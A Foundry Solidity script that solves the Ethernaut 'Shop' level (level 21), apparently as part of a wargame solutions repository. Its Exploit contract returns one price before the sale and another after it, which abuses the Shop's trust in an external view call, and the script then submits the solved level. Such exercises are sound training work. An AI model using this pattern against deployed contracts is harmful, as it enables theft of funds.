// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Shop} from "src/21/Shop.sol";
import {ShopFactory} from "src/21/ShopFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract ShopExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL21_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new ShopFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        Exploit exploit = new Exploit(instance);

        exploit.buy();

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function buy() external {
        shop.buy();
    }
}